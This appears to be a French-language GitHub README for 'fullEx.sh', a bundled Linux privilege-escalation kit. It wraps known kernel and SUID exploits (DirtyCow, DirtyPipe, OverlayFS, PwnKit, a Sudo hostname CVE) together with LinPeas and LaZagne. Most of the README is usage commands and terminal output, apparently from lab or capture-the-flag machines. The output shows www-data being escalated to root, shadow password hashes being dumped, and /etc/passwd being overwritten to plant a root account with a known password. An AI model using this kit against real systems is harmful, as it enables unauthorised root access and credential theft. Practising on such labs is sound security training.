# <img width="1335" height="890" alt="image" src="https://github.com/user-attachments/assets/c947aebb-593b-4027-bc50-ac87663ff387" />


Les exploits root & outils dispo :

💀 DirtyCow

💀 DirtyPipe

💀 OverlayFS

💀 PwnKit

🤖 LinPeas

👾 LaZagne

# ⚙️ Commandes

Pour rendre executable fullEx.sh , faire un -perm sur tout le dossier

```
vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -help
                                                                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
 
 
Usage: ./fullEx.sh COMMAND
 
Commands:
   -LinPeas       Execute LinPeas
   -LaZagne       Execute LaZagne
   -Overlays      Compilation + execution binaire - CVE-2015-1328
   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034
   -DirtyPipe     DirtyPipe - CVE-2022-0847
   -SudoHost      Sudo Hostname - CVE-2025-32462   
   -check         Verifie si gcc est installer
   -perm          Applique les droit d'execution '/fullEx'
   -help          Affiche les commandes
 ```
# 🤖 LinPeas

```
www-data@Milburg-High:/tmp/fullEx$ bash fullEx.sh -perm
www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

# 👾 LaZagne

```
root@Milburg-High:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: seb
Hash: $6$4.6B1rmh$iaH45IN/kqI4A8Yg0oeY74nXxcicIV3gplln3koT/h2T9qDbs6b0jFWyRyuP5f23OAIyNf5F2WwptKSoDvD4o1:17589:0:99999:7:::

[+] Hash found !!!
Login: bob
Hash: $6$mwc2tuOb$TeB1IALW7IE4SFkvCH9Sls/KKtxv7oLotyqNHgfXIN9a7LuG/H6ii6iocMfwdDtCxfOEEZ6Pt9iSRtf52D9kZ0:17589:0:99999:7:::

[+] Hash found !!!
Login: c0rruptedb1t
Hash: $6$j5l5DMkY$BfqvgRmf5X6dpXdqeUue4AN4OxKwQY6I8nMxmrTmy1BupMhFBkMHGnl6pMC2b06zpVUA6YJMm7SHk4NrmEhHn1:17583:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$Gki8PIx6$S6zxQ8pPsOJeakxaE8/o4FnIsgXdsFHm1uf70QOubnQWBKIlVsE99CL8/dsqlh0/fuiNZaXptU2SJ1fDRbH8A1:17599:0:99999:7:::

[+] Hash found !!!
Login: elliot
Hash: $6$lyiTlPzo$4PiESwZ0ySFbVE1bVnfoj2D7E7GfC8cFGSydW5wwXR9.LOrRx56CgXuhwIkUsLP.P/Edrz2YqcbMGqDzyohsT0:17599:0:99999:7:::

[+] Hash found !!!
Login: jc
Hash: $6$RJ.XN2vQ$T.MHaNdVoHuUxTJjgG1i4NEff6TliP7PlP0FT7jsmjXRHDhmd1cVQxGDdzuxi2ybcQPB1GPQT.zvoaexcRuXh0:17589:0:99999:7:::


[+] 6 passwords have been found.
For more information launch it again with the -v option

elapsed time = 9.25296401978

```

# 💀 PwnKit

```
www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -PwnKit64
./fullEx.sh -PwnKit64
root@Milburg-High:/tmp/fullEx#
```

# 💀 DirtyPipe

```
www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
./fullEx.sh -DirtyPipe
[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Initiating write to '/etc/passwd'...
[Dirty Pipe] Data size to write: 131 bytes
[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to '/etc/passwd'.
[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
[Dirty Pipe] Program execution completed successfully.
root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
```
# 💀 DirtyCow

```
www-data@ubuntu:/tmp/fullEx$ ./fullEx.sh -DirtyCow
./fullEx.sh -DirtyCow
[+] Compilation successfuly !
[+] PATH=/tmp/fullEx/exploits/DirtyCow/dcow
[+] Executing the binary...
Please enter the new password: azerty

/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash

mmap: 7fdfeb990000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'azerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash

mmap: 7fdfeb990000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'azerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Binary file (standard input) matches

firefart@ubuntu:~# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```
